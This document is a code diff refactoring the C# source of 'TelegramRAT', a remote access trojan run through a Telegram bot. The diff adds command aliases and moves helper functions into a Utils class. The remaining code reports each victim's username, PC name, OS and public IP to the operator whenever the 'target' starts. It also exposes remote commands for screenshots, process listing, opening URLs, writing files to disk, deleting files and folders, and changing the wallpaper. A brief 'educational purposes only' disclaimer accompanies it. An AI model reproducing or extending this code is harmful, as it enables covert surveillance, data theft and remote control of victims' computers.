@@ -62,7 +62,7 @@ namespace TelegramRAT
             Run().Wait();
             try
             {
-                
+
             }
             catch (Exception ex)
             {
@@ -89,13 +89,7 @@ namespace TelegramRAT
 #endif
         }
 
-        static async Task<string> GetIpAddress()
-        {
-            HttpClient client = new HttpClient();
-            string ip = await client.GetStringAsync("https://api.ipify.org/?format=json");
-            ip = string.Join(string.Empty, ip.Skip(7).SkipLast(2));
-            return ip;
-        }
+
 
         static async Task Run()
         {
@@ -104,8 +98,8 @@ namespace TelegramRAT
 
                 $"Username: <b>{Environment.UserName}</b>\n" +
                 $"PC name: <b>{Environment.MachineName}</b>\n" +
-                $"OS: {GetWindowsVersion()}\n\n" +
-                $"IP: {await GetIpAddress()}",
+                $"OS: {Utils.GetWindowsVersion()}\n\n" +
+                $"IP: {await Utils.GetIpAddress()}",
                 ParseMode.Html);
 
             int offset = 0;
@@ -140,8 +134,19 @@ namespace TelegramRAT
 
                 var cmd = commands.Find(cmd => cmd.Command == model.Command);
 
+
                 if (cmd == null)
-                    continue;
+                {
+                    cmd = commands.Find(cmd => cmd.Aliases != null && cmd.Aliases.Contains(model.Command));
+                    if (cmd == null)
+                    {
+                        continue;
+                    }
+                    else
+                    {
+                        model.Command = cmd.Command;
+                    }
+                }
 
                 if (ValidateModel(cmd, model))
                 {
@@ -150,7 +155,7 @@ namespace TelegramRAT
                 else
                 {
                     await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command requires arguments! \n\n" +
-                         $"To get information about this command - type /help {model.Command.Substring(1)}", replyToMessageId: model.Message.MessageId);
+                         $"To get information about this command - type /help {model.Command}", replyToMessageId: model.Message.MessageId);
                 }
 
             }
@@ -178,24 +183,6 @@ namespace TelegramRAT
 
         }
 
-        static string GetWindowsVersion()
-        {
-            try
-            {
-                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
-                if (key != null)
-                {
-                    string prodName = key.GetValue("ProductName") as string;
-                    string csdVer = key.GetValue("CSDVersion") as string;
-                    return prodName + csdVer;
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.Message);
-            }
-            return string.Empty;
-        }
 
         static void InitializeCommands(List<BotCommand> CommandsList)
         {
@@ -245,7 +232,7 @@ namespace TelegramRAT
                             Description = "📃 List of all commands"
                         }
                     };
-                    await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Welcome, since you see this message, you've done everything well. Now you will receive a message every time your target starts. I kindly remind you, that this software was written in educational purposes only, don't use it for bothering or trolling people pls.\nUse /help and /command to lern this bot functionality");
+                    await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Welcome, since you see this message, you've done everything well. Now you will receive a message every time your target starts. I kindly remind you, that this software was written in educational purposes only, don't use it for bothering or trolling people pls.\nUse /help and /command to learn this bot functionality");
                     await Bot.SetMyCommandsAsync(new List<CommandPrompt>(botCommands));
                 }
             });
@@ -271,7 +258,7 @@ namespace TelegramRAT
                     }
                     string command = model.Args[0];
 
-                    var cmd = commands.Find(cmd => cmd.Command == command);
+                    var cmd = commands.Find(cmd => cmd.Command == command || cmd.Aliases.Contains(command));
                     if (cmd == null)
                     {
                         await Bot.SendTextMessageAsync(model.Message.Chat.Id, "This command doesn't exist! " +
@@ -418,6 +405,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "processes",
+                Aliases = new string[] { "prcss" },
                 CountArgs = 0,
                 Description = "Get list of running processes.",
                 Example = "/processes",
@@ -454,6 +442,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "process",
+                Aliases = new string[] { "proc" },
                 CountArgs = 1,
 
                 Description = "Show info about process by its id.",
@@ -698,6 +687,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "screenshot",
+                Aliases = new string[] { "screen" },
                 CountArgs = 0,
                 Description = "Take a screenshot of all displays area.",
                 Example = "/screenshot",
@@ -827,6 +817,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "openurl",
+                Aliases = new string[] { "url" },
                 IgnoreCountArgs = true,
 
                 Description = "Open URL with default browser.",
@@ -867,11 +858,11 @@ namespace TelegramRAT
                             await Bot.SendTextMessageAsync(model.Message.Chat.Id, "No file or images provided.", replyToMessageId: model.Message.MessageId);
                             return;
                         }
-                        foreach(var file in model.Files)
+                        foreach (var file in model.Files)
                         {
                             FileStream fs = new FileStream(model.Filename ?? file.FileUniqueId + ".jpg", FileMode.Create);
                             var telegramFile = await Bot.GetFileAsync(file.FileId);
-                            
+
                             await Bot.DownloadFileAsync(telegramFile.FilePath, fs);
                             fs.Close();
                         }
@@ -947,7 +938,7 @@ namespace TelegramRAT
                 {
                     try
                     {
-                        if(model.Files.Length == 0)
+                        if (model.Files.Length == 0)
                         {
                             await Bot.SendTextMessageAsync(model.Message.Chat.Id, "No image or file provided.", replyToMessageId: model.Message.MessageId);
                             return;
@@ -956,7 +947,7 @@ namespace TelegramRAT
 
                         using (FileStream wallpapperImageFileStream = new FileStream(Path.GetTempPath() + "wllppr.jpg", FileMode.Create))
                             await Bot.DownloadFileAsync(tgfile.FilePath, wallpapperImageFileStream);
-                        
+
                         WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, Path.GetTempPath() + "wllppr.jpg", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
                         System.IO.File.Delete(Path.GetTempPath() + "wllppr.jpg");
                         await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
@@ -1521,10 +1512,11 @@ namespace TelegramRAT
             //DELETE FILE
             CommandsList.Add(new BotCommand
             {
-                Command = "deletefile",
+                Command = "delete",
+                Aliases = new string[] { "del" },
                 MayHaveNoArgs = false,
                 Description = "Delete file in path",
-                Example = "/deletefile hello world.txt",
+                Example = "/delete hello world.txt",
                 Execute = async model =>
                 {
                     try
@@ -1550,10 +1542,11 @@ namespace TelegramRAT
             //CREATE FOLDER
             CommandsList.Add(new BotCommand
             {
-                Command = "createfolder",
+                Command = "mkdir",
+                Aliases = new string[] { "md" },
                 MayHaveNoArgs = false,
-                Description = "Create folder.",
-                Example = "/createfolder C:\\Users\\User\\Documents\\NewFolder",
+                Description = "Create directory.",
+                Example = "/mkdir C:\\Users\\User\\Documents\\NewFolder",
                 Execute = async model =>
                 {
 
@@ -1579,10 +1572,10 @@ namespace TelegramRAT
             //DELETE FOLDER
             CommandsList.Add(new BotCommand
             {
-                Command = "deletefolder",
+                Command = "rmdir",
                 MayHaveNoArgs = false,
-                Description = "Delete folder.",
-                Example = "/deletefolder C:\\Users\\User\\Desktop\\My Folder",
+                Description = "Remove directory.",
+                Example = "/rmdir C:\\Users\\User\\Desktop\\My Folder",
                 Execute = async model =>
                 {
                     try
@@ -1606,9 +1599,12 @@ namespace TelegramRAT
             //RENAME FILE
             CommandsList.Add(new BotCommand
             {
-                Command = "renamefile",
+                Command = "rename",
+                Aliases = new string[] { "ren" },
+
+                CountArgs = 2,
                 Description = "Rename file. First argument must be path (full or relative) for file. Second argument must contain only new name.",
-                Example = "/renamefile \"C:\\Users\\User\\Documents\\Old Name.txt\" \"New Name.txt\"",
+                Example = "/rename \"C:\\Users\\User\\Documents\\Old Name.txt\" \"New Name.txt\"",
                 Execute = async model =>
                 {
                     try
@@ -1895,7 +1891,7 @@ namespace TelegramRAT
                         $"User name: {Environment.UserName}\n" +
                         $"PC name: {Environment.MachineName}\n\n" +
 
-                        $"OS: {GetWindowsVersion()}({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})\n" +
+                        $"OS: {Utils.GetWindowsVersion()}({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})\n" +
                         $"NT version: {Environment.OSVersion.Version}\n" +
                         $"Process: {(Environment.Is64BitProcess ? "64-bit" : "32-bit")}\n\n" +
                         $"To get ip address and other network info type /netinfo";
@@ -1953,12 +1949,12 @@ namespace TelegramRAT
                 Example = "/netinfo",
                 Execute = async model =>
                 {
-                    string ipaddr = await GetIpAddress();
+                    string ipaddr = await Utils.GetIpAddress();
                     HttpClient httpClient = new HttpClient();
                     string ipinfo = await httpClient.GetStringAsync("http://ip-api.com/xml/" + ipaddr);
                     System.Xml.XmlDocument doc = new System.Xml.XmlDocument();
                     doc.LoadXml(ipinfo);
-                    
+
                     TextReader reader = new StringReader(doc.ChildNodes[1].OuterXml);
                     var serializer = new System.Xml.Serialization.XmlSerializer(typeof(NetworkInfo));
                     NetworkInfo ni = serializer.Deserialize(reader) as NetworkInfo;
